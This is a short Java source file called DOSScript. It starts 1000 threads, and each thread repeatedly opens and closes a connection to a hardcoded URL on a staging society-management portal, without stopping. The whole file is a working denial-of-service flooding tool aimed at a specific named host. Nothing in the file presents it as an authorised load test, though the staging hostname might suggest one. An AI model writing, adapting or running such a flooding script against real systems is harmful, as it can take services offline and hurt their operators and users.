import java.io.IOException;
import java.io.InputStream;
import java.net.URL;

/**
 * 
 * @author anandm
 * @date Sep 8, 2015 4:15:16 PM
 */
public class DOSScript {

    public void run() throws IOException {
        final URL url = new URL(
                "http://stg.mysociety.org.in/societymanagementportal/accounts/society?emailId=nobody%40mkcl.org");

        for (int i = 0; i < 1000; i++) {
            Thread thread = new Thread(new Runnable() {

                @Override
                public void run() {
                    while (true) {
                        InputStream is = null;
                        try {
                            is = url.openStream();
                        }
                        catch (IOException e) {

                            System.out.println("Open Error :  "
                                    + e.getMessage());
                        }
                        try {
                            if (is != null) {
                                is.close();
                            }

                        }
                        catch (IOException e) {

                            System.out.println("Close Error : "
                                    + e.getMessage());
                        }
                    }
                }
            });

            thread.start();
        }

    }

    public static void main(String[] args) throws IOException {
        DOSScript main = new DOSScript();
        main.run();
    }
}
